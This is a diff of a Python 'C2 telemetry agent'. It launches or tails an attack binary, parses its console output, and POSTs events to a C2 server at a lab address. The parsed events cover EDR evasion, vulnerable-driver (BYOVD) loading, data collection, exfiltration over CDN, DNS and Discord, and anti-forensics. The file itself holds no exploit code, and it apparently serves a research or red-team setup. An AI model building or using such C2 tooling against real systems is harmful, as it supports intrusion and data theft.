@@ -2,380 +2,290 @@
 """
 JOCKY C2 Telemetry Agent
 
-Runs a JOCKY binary as a subprocess, captures output in real-time, parses phase
-completion and activity messages, and sends structured telemetry events to a C2
-backend via HTTP POST.
-
-Events captured:
-- Phase starts/completions
-- BYOVD driver attempts (pending/success/failure)
-- Data collection events
-- Exfiltration status
-- Forensic analysis results
+Runs a JOCKY binary as a subprocess, captures output in real-time, parses
+telemetry events from console output, and sends them immediately to the C2
+backend via HTTP POST. Zero external dependencies — uses only stdlib.
 """
 
 import subprocess
 import re
 import json
 import time
-import threading
+import sys
 import logging
-from datetime import datetime
-from typing import Optional, Dict, Any, List
-from collections import deque
+import argparse
+from datetime import datetime, timezone
 from pathlib import Path
+from urllib.request import Request, urlopen
+from urllib.error import URLError
 
-try:
-    import requests
-except ImportError:
-    requests = None
+PHASE_MAP = {
+    "lpe": -1, "0": 0, "0.5": 0, "1": 1, "2": 2, "3": 3,
+    "4": 4, "5": 5, "6": 6, "7": 7, "8": 8, "9": 9,
+    "10": 10, "11": 11, "12": 12,
+}
+
+PATTERNS = [
+    ("phase_start",    re.compile(r"\[\*\]\s+Phase\s+([\d.]+|[A-Z]+):", re.I)),
+    ("edr_complete",   re.compile(r"\[\+\]\s+EDR\s+Evasion:\s+(\d+)\s+techniques\s+deployed", re.I)),
+    ("model_cached",   re.compile(r"\[\+\]\s+Model\s+cached:\s+(\d+)\s+bytes", re.I)),
+    ("data_collected", re.compile(r"\[\+\]\s+Data\s+Collection:\s+(\d+)\s+bytes", re.I)),
+    ("driver_try",     re.compile(r"\[BYOVD\]\s+Trying\s+driver:\s+(\S+)", re.I)),
+    ("driver_ok",      re.compile(r"\[BYOVD\]\s+Device\s+handle\s*:?\s*OK", re.I)),
+    ("driver_fail",    re.compile(r"\[BYOVD\]\s+Device\s+open\s+FAILED\s+\(err=(\d+)\)", re.I)),
+    ("svc_fail",       re.compile(r"\[BYOVD\]\s+StartService\s+failed:\s+(\d+)", re.I)),
+    ("exfil_cdn",      re.compile(r"\[\+\]\s+CDN\s+exfiltration\s+successful", re.I)),
+    ("exfil_dns",      re.compile(r"\[\+\]\s+DNS\s+tunnel\s+exfiltration\s+successful", re.I)),
+    ("exfil_discord",  re.compile(r"\[\+\]\s+Discord\s+exfiltration\s+successful", re.I)),
+    ("exfil_complete", re.compile(r"\[\+\]\s+Multi-channel\s+exfiltration\s+complete", re.I)),
+    ("forensic_done",  re.compile(r"\[\+\]\s+Forensic\s+(?:analysis\s+)?phase\s+complete", re.I)),
+    ("antifor_done",   re.compile(r"\[\+\]\s+Anti-forensics\s+complete", re.I)),
+    ("exec_complete",  re.compile(r"\[\+\]\s+Execution\s+complete", re.I)),
+]
+
+log = logging.getLogger("telemetry")
 
 
-class TelemetryAgent:
-    """
-    Telemetry agent for JOCKY C2 binary execution.
+def now_iso():
+    return datetime.now(timezone.utc).strftime("%Y-%m-%dT%H:%M:%S.%fZ")
 
-    Runs a binary as a subprocess, parses telemetry from stdout/stderr,
-    batches events, and sends to C2 backend with retry logic.
-    """
 
-    # Regex patterns for event parsing
-    PHASE_START_PATTERN = re.compile(r"\[\*\]\s+Phase\s+(\d+):", re.IGNORECASE)
-    BYOVD_DRIVER_TRY_PATTERN = re.compile(r"\[BYOVD\]\s+Trying\s+driver:\s+(\S+)", re.IGNORECASE)
-    BYOVD_DEVICE_OK_PATTERN = re.compile(r"\[BYOVD\]\s+Device\s+handle:\s+OK", re.IGNORECASE)
-    BYOVD_DEVICE_FAILED_PATTERN = re.compile(r"\[BYOVD\]\s+Device\s+open\s+FAILED\s+\(err=(\d+)\)", re.IGNORECASE)
-    DATA_COLLECTION_PATTERN = re.compile(r"\[\+\]\s+Data\s+Collection:\s+(\d+)\s+bytes", re.IGNORECASE)
-    CDN_EXFIL_PATTERN = re.compile(r"\[\+\]\s+CDN\s+exfiltration\s+successful", re.IGNORECASE)
-    FORENSIC_COMPLETE_PATTERN = re.compile(r"\[\+\]\s+Forensic\s+analysis\s+phase\s+complete", re.IGNORECASE)
-
-    def __init__(
-        self,
-        binary_path: str,
-        c2_url: str = "http://192.168.56.1:8443/api/telemetry/report",
-        chain_id: str = "research_chain_v4",
-        batch_interval: float = 10.0,
-        max_retries: int = 3,
-        log_file: Optional[str] = None,
-    ):
-        """
-        Initialize telemetry agent.
-
-        Args:
-            binary_path: Path to JOCKY binary to run
-            c2_url: C2 backend telemetry endpoint
-            chain_id: Chain identifier for this telemetry session
-            batch_interval: Max seconds before batching and sending events
-            max_retries: Max retries for failed HTTP POSTs
-            log_file: Optional log file path (logs to console if None)
-        """
-        self.binary_path = binary_path
-        self.c2_url = c2_url
-        self.chain_id = chain_id
-        self.batch_interval = batch_interval
-        self.max_retries = max_retries
-
-        self.events: deque = deque()
-        self.running = False
-        self.process = None
-        self.last_phase = None
-        self.last_driver_name = None
-        self.lock = threading.Lock()
-
-        # Setup logging
-        self.logger = logging.getLogger(__name__)
-        self.logger.setLevel(logging.DEBUG)
-        handler = logging.FileHandler(log_file) if log_file else logging.StreamHandler()
-        formatter = logging.Formatter("%(asctime)s - %(levelname)s - %(message)s")
-        handler.setFormatter(formatter)
-        if not self.logger.handlers:
-            self.logger.addHandler(handler)
-
-    def parse_line(self, line: str) -> Optional[Dict[str, Any]]:
-        """
-        Parse a line from binary output into a telemetry event.
-
-        Returns None if line doesn't match any pattern.
-        """
-        timestamp = datetime.utcnow().isoformat() + "Z"
-
-        # Phase start
-        match = self.PHASE_START_PATTERN.search(line)
-        if match:
-            phase_num = int(match.group(1))
-            self.last_phase = phase_num
-            return {
-                "timestamp": timestamp,
-                "chain_id": self.chain_id,
-                "event_type": "phase_start",
-                "phase": phase_num,
-                "status": "pending",
-                "details": {"raw": line},
-            }
-
-        # BYOVD driver attempt - trying
-        match = self.BYOVD_DRIVER_TRY_PATTERN.search(line)
-        if match:
-            driver_name = match.group(1)
-            self.last_driver_name = driver_name
-            return {
-                "timestamp": timestamp,
-                "chain_id": self.chain_id,
-                "event_type": "driver_attempt",
-                "phase": self.last_phase or 0,
-                "status": "pending",
-                "details": {"driver": driver_name, "action": "attempting"},
-            }
-
-        # BYOVD device handle success
-        match = self.BYOVD_DEVICE_OK_PATTERN.search(line)
-        if match:
-            return {
-                "timestamp": timestamp,
-                "chain_id": self.chain_id,
-                "event_type": "driver_attempt",
-                "phase": self.last_phase or 0,
-                "status": "success",
-                "details": {
-                    "driver": self.last_driver_name or "unknown",
-                    "action": "device_open",
-                },
-            }
-
-        # BYOVD device open failed
-        match = self.BYOVD_DEVICE_FAILED_PATTERN.search(line)
-        if match:
-            error_code = int(match.group(1))
-            return {
-                "timestamp": timestamp,
-                "chain_id": self.chain_id,
-                "event_type": "driver_attempt",
-                "phase": self.last_phase or 0,
-                "status": "failure",
-                "details": {
-                    "driver": self.last_driver_name or "unknown",
-                    "action": "device_open",
-                    "error_code": error_code,
-                },
-            }
-
-        # Data collection
-        match = self.DATA_COLLECTION_PATTERN.search(line)
-        if match:
-            bytes_collected = int(match.group(1))
-            return {
-                "timestamp": timestamp,
-                "chain_id": self.chain_id,
-                "event_type": "data_collected",
-                "phase": self.last_phase or 0,
-                "status": "success",
-                "details": {"bytes": bytes_collected},
-            }
-
-        # CDN exfiltration
-        match = self.CDN_EXFIL_PATTERN.search(line)
-        if match:
-            return {
-                "timestamp": timestamp,
-                "chain_id": self.chain_id,
-                "event_type": "exfil_sent",
-                "phase": self.last_phase or 0,
-                "status": "success",
-                "details": {"channel": "cdn"},
-            }
-
-        # Forensic analysis complete
-        match = self.FORENSIC_COMPLETE_PATTERN.search(line)
-        if match:
-            return {
-                "timestamp": timestamp,
-                "chain_id": self.chain_id,
-                "event_type": "phase_complete",
-                "phase": self.last_phase or 0,
-                "status": "success",
-                "details": {"type": "forensic_analysis"},
-            }
-
-        return None
-
-    def add_event(self, event: Dict[str, Any]) -> None:
-        """Add an event to the batch queue."""
-        with self.lock:
-            self.events.append(event)
-        self.logger.debug(f"Event queued: {event['event_type']} - {event['status']}")
-
-    def send_batch(self, events: List[Dict[str, Any]]) -> bool:
-        """
-        Send events to C2 backend with retry logic.
-        Sends each event individually to match backend API format.
-
-        Returns True if all events sent successfully, False if any failed.
-        """
-        if not events:
+def send_event(url, event):
+    body = json.dumps(event).encode("utf-8")
+    req = Request(url, data=body, headers={"Content-Type": "application/json"}, method="POST")
+    try:
+        with urlopen(req, timeout=5) as resp:
+            log.info(f"  -> sent {event['event_type']} phase={event['phase']} [{resp.status}]")
             return True
+    except URLError as e:
+        log.warning(f"  -> FAILED to send: {e}")
+        return False
+    except Exception as e:
+        log.warning(f"  -> FAILED to send: {e}")
+        return False
 
-        if requests is None:
-            self.logger.warning("requests module not available, logging events locally only")
-            for event in events:
-                self.logger.info(f"Event (local): {json.dumps(event)}")
-            return True
 
-        # Send each event individually
-        all_success = True
-        for event in events:
-            for attempt in range(self.max_retries):
-                try:
-                    response = requests.post(
-                        self.c2_url,
-                        json=event,  # Send event directly, not wrapped
-                        timeout=5,
-                        verify=False,  # Allow self-signed certs
-                    )
-                    if response.status_code in (200, 201, 202):
-                        self.logger.info(
-                            f"Sent event: {event.get('event_type')} (status={response.status_code})"
-                        )
-                        break  # Move to next event
-                    else:
-                        self.logger.warning(
-                            f"Event send failed (status={response.status_code}): {response.text[:200]}"
-                        )
-                except Exception as e:
-                    self.logger.warning(f"Attempt {attempt + 1}/{self.max_retries}: {e}")
-                    if attempt < self.max_retries - 1:
-                        time.sleep(2 ** attempt)  # Exponential backoff
-                        continue
-                    all_success = False
-                    break
-            else:
-                # All retries exhausted for this event
-                all_success = False
+def parse_and_send(line, state, c2_url, chain_id):
+    ts = now_iso()
+    p = state["phase"]
 
-        return all_success
+    for name, pattern in PATTERNS:
+        m = pattern.search(line)
+        if not m:
+            continue
 
-    def batch_and_send_worker(self) -> None:
-        """
-        Background worker thread that periodically batches and sends events.
-        Runs until self.running is False.
-        """
-        while self.running:
-            time.sleep(self.batch_interval)
-            batch = None
-            with self.lock:
-                if self.events:
-                    batch = list(self.events)
-                    self.events.clear()
+        if name == "phase_start":
+            label = m.group(1).lower()
+            p = PHASE_MAP.get(label, 0)
+            state["phase"] = p
+            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "phase_start",
+                     "phase": p, "status": "active", "details": {"raw": line.strip()}}
 
-            if batch:
-                self.send_batch(batch)
+        elif name == "edr_complete":
+            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "phase_complete",
+                     "phase": 0, "status": "success", "details": {"techniques": int(m.group(1))}}
 
-    def run(self, binary_args: Optional[List[str]] = None) -> int:
-        """
-        Run the JOCKY binary and collect telemetry.
+        elif name == "model_cached":
+            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "phase_complete",
+                     "phase": 2, "status": "success", "details": {"bytes": int(m.group(1))}}
 
-        Args:
-            binary_args: Additional arguments to pass to the binary
+        elif name == "data_collected":
+            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "data_collected",
+                     "phase": p, "status": "success", "details": {"bytes": int(m.group(1))}}
 
-        Returns:
-            Exit code of the binary process
-        """
-        self.running = True
-        self.logger.info(f"Starting JOCKY binary: {self.binary_path}")
+        elif name == "driver_try":
+            state["driver"] = m.group(1)
+            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "driver_attempt",
+                     "phase": p, "status": "pending", "details": {"driver": m.group(1)}}
 
-        # Start background batch/send worker
-        sender_thread = threading.Thread(target=self.batch_and_send_worker, daemon=True)
-        sender_thread.start()
+        elif name == "driver_ok":
+            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "driver_attempt",
+                     "phase": p, "status": "success", "details": {"driver": state.get("driver", "unknown")}}
 
+        elif name in ("driver_fail", "svc_fail"):
+            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "driver_attempt",
+                     "phase": p, "status": "failure",
+                     "details": {"driver": state.get("driver", "unknown"), "error_code": int(m.group(1))}}
+
+        elif name == "exfil_cdn":
+            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "exfil_sent",
+                     "phase": p, "status": "success", "details": {"channel": "cdn"}}
+        elif name == "exfil_dns":
+            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "exfil_sent",
+                     "phase": p, "status": "success", "details": {"channel": "dns"}}
+        elif name == "exfil_discord":
+            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "exfil_sent",
+                     "phase": p, "status": "success", "details": {"channel": "discord"}}
+
+        elif name == "exfil_complete":
+            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "phase_complete",
+                     "phase": 6, "status": "success", "details": {}}
+        elif name == "forensic_done":
+            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "phase_complete",
+                     "phase": 10, "status": "success", "details": {}}
+        elif name == "antifor_done":
+            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "phase_complete",
+                     "phase": 11, "status": "success", "details": {}}
+        elif name == "exec_complete":
+            event = {"timestamp": ts, "chain_id": chain_id, "event_type": "phase_complete",
+                     "phase": 12, "status": "success", "details": {}}
+        else:
+            continue
+
+        send_event(c2_url, event)
+        return True
+
+    return False
+
+
+def find_binary():
+    for path in [r"C:\research_chain_windows_production.exe",
+                 r"Z:\research_chain_windows_production.exe",
+                 "research_chain_windows_production.exe"]:
         try:
-            # Start subprocess
-            cmd = [self.binary_path] + (binary_args or [])
-            self.process = subprocess.Popen(
-                cmd,
-                stdout=subprocess.PIPE,
-                stderr=subprocess.PIPE,
-                text=True,
-                bufsize=1,  # Line buffered
-            )
+            if Path(path).exists():
+                return str(Path(path).resolve())
+        except Exception:
+            pass
+    return None
 
-            # Read output line by line
-            self.logger.info("Reading subprocess output...")
-            for line in self.process.stdout:
+
+def run_from_stdin(args):
+    """Read binary output from stdin (piped mode)."""
+    state = {"phase": 0, "driver": None}
+    event_count = 0
+
+    for line in sys.stdin:
+        line = line.rstrip("\n\r")
+        if not line:
+            continue
+        print(f"  {line}")
+        if parse_and_send(line, state, args.c2_url, args.chain_id):
+            event_count += 1
+
+    log.info(f"Total events sent: {event_count}")
+
+
+def run_from_file(filepath, args):
+    """Tail a log file in real-time, parsing lines as they appear."""
+    state = {"phase": 0, "driver": None}
+    event_count = 0
+    seen_complete = False
+
+    log.info(f"Tailing: {filepath}")
+    log.info("Waiting for output... (start the binary in another window)")
+
+    while not Path(filepath).exists():
+        time.sleep(0.2)
+
+    with open(filepath, "r", encoding="utf-8", errors="replace") as f:
+        idle_count = 0
+        while True:
+            line = f.readline()
+            if line:
+                idle_count = 0
                 line = line.rstrip("\n\r")
-                self.logger.debug(f"[subprocess] {line}")
+                if not line:
+                    continue
+                print(f"  {line}")
+                if parse_and_send(line, state, args.c2_url, args.chain_id):
+                    event_count += 1
+                if "Execution complete" in line or "window closing" in line:
+                    seen_complete = True
+            else:
+                if seen_complete:
+                    # Binary finished, drain any remaining lines
+                    time.sleep(0.5)
+                    remaining = f.readline()
+                    if not remaining:
+                        break
+                idle_count += 1
+                time.sleep(0.1)
+                # Timeout after 10 min of no output
+                if idle_count > 6000:
+                    log.warning("No output for 10 minutes, stopping")
+                    break
 
-                # Try to parse as event
-                event = self.parse_line(line)
-                if event:
-                    self.add_event(event)
+    log.info(f"Total events sent: {event_count}")
 
-            # Wait for process to finish
-            self.process.wait()
-            exit_code = self.process.returncode
 
-            # Flush any remaining events
-            self.logger.info("Flushing remaining events...")
-            time.sleep(0.5)  # Small delay to let events queue
-            with self.lock:
-                if self.events:
-                    batch = list(self.events)
-                    self.events.clear()
-                else:
-                    batch = []
-            if batch:
-                self.send_batch(batch)
+def run_subprocess(binary, args):
+    """Launch binary as subprocess and capture output."""
+    log.info("Launching binary...")
+    proc = subprocess.Popen(
+        [binary],
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT,
+        text=True,
+        bufsize=1,
+        errors="replace",
+    )
 
-            self.logger.info(f"Binary exited with code {exit_code}")
-            return exit_code
+    state = {"phase": 0, "driver": None}
+    event_count = 0
 
-        except FileNotFoundError:
-            self.logger.error(f"Binary not found: {self.binary_path}")
-            return 127
-        except Exception as e:
-            self.logger.error(f"Error running binary: {e}")
-            return 1
-        finally:
-            self.running = False
-            sender_thread.join(timeout=2)
+    while True:
+        line = proc.stdout.readline()
+        if not line and proc.poll() is not None:
+            break
+        if not line:
+            continue
+        line = line.rstrip("\n\r")
+        if not line:
+            continue
+        print(f"  {line}")
+        if parse_and_send(line, state, args.c2_url, args.chain_id):
+            event_count += 1
+
+    exit_code = proc.returncode
+    log.info(f"Binary exited with code {exit_code}")
+    log.info(f"Total events sent: {event_count}")
+
+    if exit_code == 0 and event_count <= 2:
+        log.warning("Very few events captured. Try piped mode instead:")
+        log.warning("  Z:\\research_chain_windows_production.exe 2>&1 | python Z:\\telemetry_agent.py --pipe")
 
 
 def main():
-    """Usage example and testing."""
-    import sys
+    logging.basicConfig(level=logging.INFO, format="%(asctime)s %(levelname)s %(message)s")
 
-    # Setup logging for example
-    logging.basicConfig(
-        level=logging.INFO,
-        format="%(asctime)s - %(name)s - %(levelname)s - %(message)s",
-    )
+    parser = argparse.ArgumentParser(description="JOCKY C2 Telemetry Agent")
+    parser.add_argument("--binary", type=str, default=None)
+    parser.add_argument("--pipe", action="store_true", help="Read binary output from stdin instead of launching it")
+    parser.add_argument("--file", type=str, default=None, help="Tail a log file for binary output (real-time)")
+    parser.add_argument("--chain-id", type=str, default="research_chain_v4")
+    parser.add_argument("--c2-url", type=str, default="http://192.168.56.1:8443/api/telemetry/report")
+    args = parser.parse_args()
 
-    # Example 1: Run a dummy binary (for testing)
-    if len(sys.argv) > 1:
-        binary_path = sys.argv[1]
-        agent = TelemetryAgent(
-            binary_path=binary_path,
-            c2_url="http://192.168.56.1:8443/api/telemetry/report",
-            chain_id="research_chain_v4",
-            batch_interval=10.0,
-        )
-        exit_code = agent.run()
-        sys.exit(exit_code)
+    log.info(f"C2 URL:   {args.c2_url}")
+    log.info(f"Chain ID: {args.chain_id}")
 
-    # Example 2: Test with a simple shell script that produces output
-    print("TelemetryAgent Example Usage:")
-    print()
-    print("  # Run against a real JOCKY binary:")
-    print("  python3 telemetry_agent.py ./jocky_binary")
-    print()
-    print("  # Run with arguments:")
-    print("  agent = TelemetryAgent('./jocky_binary', chain_id='prod_chain_v1')")
-    print("  exit_code = agent.run(['--aggressive', '--forensic'])")
-    print()
-    print("Example telemetry events that will be parsed and sent:")
-    print("  [*] Phase 1: Starting BYOVD exploitation")
-    print("  [BYOVD] Trying driver: storage_adapter.sys")
-    print("  [BYOVD] Device handle: OK")
-    print("  [+] Data Collection: 576 bytes")
-    print("  [+] CDN exfiltration successful")
-    print("  [+] Forensic analysis phase complete")
+    # Quick connectivity test
+    log.info("Testing C2 connectivity...")
+    test_ok = send_event(args.c2_url, {
+        "timestamp": now_iso(), "chain_id": args.chain_id,
+        "event_type": "agent_start", "phase": -1, "status": "active",
+        "details": {"mode": "pipe" if args.pipe else "subprocess"}
+    })
+    if not test_ok:
+        log.error("Cannot reach C2 backend! Check that the backend is running.")
+        log.error(f"  Tried: {args.c2_url}")
+        sys.exit(1)
+    log.info("C2 connectivity OK")
+
+    if args.file:
+        log.info(f"File tail mode — watching {args.file}")
+        run_from_file(args.file, args)
+    elif args.pipe:
+        log.info("Pipe mode — reading binary output from stdin...")
+        run_from_stdin(args)
+    else:
+        binary = args.binary or find_binary()
+        if not binary:
+            log.error("Binary not found. Use --binary <path> or --pipe mode")
+            sys.exit(1)
+        log.info(f"Binary:   {binary}")
+        run_subprocess(binary, args)
 
 
 if __name__ == "__main__":
